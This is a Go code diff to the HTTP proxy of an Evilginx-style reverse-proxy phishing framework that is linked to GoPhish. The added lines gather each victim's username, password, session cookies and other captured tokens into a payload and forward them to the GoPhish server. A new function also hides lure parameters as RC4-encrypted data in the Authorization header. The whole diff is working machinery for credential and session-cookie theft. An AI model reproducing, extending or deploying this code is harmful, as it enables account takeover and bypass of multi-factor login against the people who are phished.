@@ -375,7 +375,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									// set params from url arguments
-									p.extractParams(session, req.URL)
+									p.extractAuth(session, req.Header)
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										if trackParam, ok := session.Params["o"]; ok {
@@ -385,7 +385,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if ok && rid != "" {
 													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
+													rq := ResultRequest{
+														Address:   remote_addr,
+														UserAgent: req.Header.Get("User-Agent"),
+													}
+													err = p.gophish.ReportEmailOpened(rid, rq)
 													if err != nil {
 														log.Error("gophish: %s", err)
 													}
@@ -406,7 +410,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										rid, ok := session.Params["rid"]
 										if ok && rid != "" {
 											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
+											rq := ResultRequest{
+												Address:   remote_addr,
+												UserAgent: req.Header.Get("User-Agent"),
+											}
+											err = p.gophish.ReportEmailLinkClicked(rid, rq)
 											if err != nil {
 												log.Error("gophish: %s", err)
 											}
@@ -496,7 +504,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
+										html, err := os.ReadFile(index_found)
 										if err == nil {
 
 											html = p.injectOgHeaders(l, html)
@@ -657,9 +665,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
-					body, err := ioutil.ReadAll(req.Body)
+					body, err := io.ReadAll(req.Body)
 					if err == nil {
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
@@ -846,7 +854,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
 
@@ -1002,7 +1010,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			body, err := io.ReadAll(resp.Body)
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1066,7 +1074,54 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
 								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+								rq := ResultRequest{
+									Address:   s.RemoteAddr,
+									UserAgent: s.UserAgent,
+									EventDetails: EventDetails{
+										Payload: url.Values{
+											"evilid":   {s.Id},
+											"name":     {s.Name},
+											"username": {s.Username},
+											"password": {s.Password},
+											"phishlet": {s.PhishLure.Phishlet},
+										},
+										Browser: map[string]string{
+											"address":    s.RemoteAddr,
+											"user-agent": s.UserAgent,
+										},
+									},
+								}
+
+								// Serialize the maps to JSON
+								bodytokensJSON, err := json.Marshal(s.BodyTokens)
+								if err != nil {
+									log.Error("Failed to serialize BodyTokens: %s", err)
+								} else {
+									rq.EventDetails.Payload.Set("bodytokens", string(bodytokensJSON))
+								}
+
+								cookietokensJSON, err := json.Marshal(s.CookieTokens)
+								if err != nil {
+									log.Error("Failed to serialize HttpTokens: %s", err)
+								} else {
+									rq.EventDetails.Payload.Set("cookietokens", string(cookietokensJSON))
+								}
+
+								httptokensJSON, err := json.Marshal(s.HttpTokens)
+								if err != nil {
+									log.Error("Failed to serialize HttpTokens: %s", err)
+								} else {
+									rq.EventDetails.Payload.Set("httptokens", string(httptokensJSON))
+								}
+
+								customJSON, err := json.Marshal(s.Custom)
+								if err != nil {
+									log.Error("Failed to serialize Custom: %s", err)
+								} else {
+									rq.EventDetails.Payload.Set("custom", string(customJSON))
+								}
+
+								err = p.gophish.ReportCredentialsSubmitted(rid, rq)
 								if err != nil {
 									log.Error("gophish: %s", err)
 								}
@@ -1178,7 +1233,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -1206,7 +1261,54 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								rid, ok := s.Params["rid"]
 								if ok && rid != "" {
 									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+									rq := ResultRequest{
+										Address:   s.RemoteAddr,
+										UserAgent: s.UserAgent,
+										EventDetails: EventDetails{
+											Payload: url.Values{
+												"evilid":   {s.Id},
+												"name":     {s.Name},
+												"username": {s.Username},
+												"password": {s.Password},
+												"phishlet": {s.PhishLure.Phishlet},
+											},
+											Browser: map[string]string{
+												"address":    s.RemoteAddr,
+												"user-agent": s.UserAgent,
+											},
+										},
+									}
+
+									// Serialize the maps to JSON
+									bodytokensJSON, err := json.Marshal(s.BodyTokens)
+									if err != nil {
+										log.Error("Failed to serialize BodyTokens: %s", err)
+									} else {
+										rq.EventDetails.Payload.Set("bodytokens", string(bodytokensJSON))
+									}
+
+									cookietokensJSON, err := json.Marshal(s.CookieTokens)
+									if err != nil {
+										log.Error("Failed to serialize HttpTokens: %s", err)
+									} else {
+										rq.EventDetails.Payload.Set("cookietokens", string(cookietokensJSON))
+									}
+
+									httptokensJSON, err := json.Marshal(s.HttpTokens)
+									if err != nil {
+										log.Error("Failed to serialize HttpTokens: %s", err)
+									} else {
+										rq.EventDetails.Payload.Set("httptokens", string(httptokensJSON))
+									}
+
+									customJSON, err := json.Marshal(s.Custom)
+									if err != nil {
+										log.Error("Failed to serialize Custom: %s", err)
+									} else {
+										rq.EventDetails.Payload.Set("custom", string(customJSON))
+									}
+
+									err = p.gophish.ReportCredentialsSubmitted(rid, rq)
 									if err != nil {
 										log.Error("gophish: %s", err)
 									}
@@ -1435,6 +1537,72 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 			}
 		}*/
 	return ret
+}
+
+func (p *HttpProxy) extractAuth(session *Session, header http.Header) bool {
+
+	// Extract the Authorization header value
+	authHeader := header.Get("Authorization")
+	if authHeader == "" {
+		log.Warning("Authorization header is missing")
+		return false
+	}
+
+	// Ensure the header is long enough to contain the encKey and encoded data
+	if len(authHeader) < 9 {
+		log.Warning("Authorization header is too short to contain valid data")
+		return false
+	}
+
+	// Split the header into the encryption key and the encrypted values
+	encKey := authHeader[:8]
+	encVals, err := base64.RawURLEncoding.DecodeString(authHeader[8:])
+	if err != nil {
+		log.Debug("Failed to decode base64: %s", err)
+		return false
+	}
+
+	// Ensure the decoded values are long enough to contain a checksum and data
+	if len(encVals) < 2 {
+		log.Warning("Decoded values are too short to contain valid data")
+		return false
+	}
+
+	// Decrypt the parameters using RC4
+	decParams := make([]byte, len(encVals)-1)
+	crc := encVals[0]
+	cipher, err := rc4.NewCipher([]byte(encKey))
+	if err != nil {
+		log.Debug("Failed to initialize RC4 cipher: %s", err)
+		return false
+	}
+	cipher.XORKeyStream(decParams, encVals[1:])
+
+	// Validate checksum (CRC)
+	var crcChk byte
+	for _, c := range decParams {
+		crcChk += byte(c)
+	}
+
+	if crc != crcChk {
+		log.Warning("Checksum mismatch - possible data corruption")
+		return false
+	}
+
+	// Parse the decrypted parameters
+	params, err := url.ParseQuery(string(decParams))
+	if err != nil {
+		log.Debug("Failed to parse decrypted parameters: %s", err)
+		return false
+	}
+
+	// Store parameters in session
+	for k, v := range params {
+		log.Debug("param: %s='%s'", k, v[0])
+		session.Params[k] = v[0]
+	}
+
+	return true
 }
 
 func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
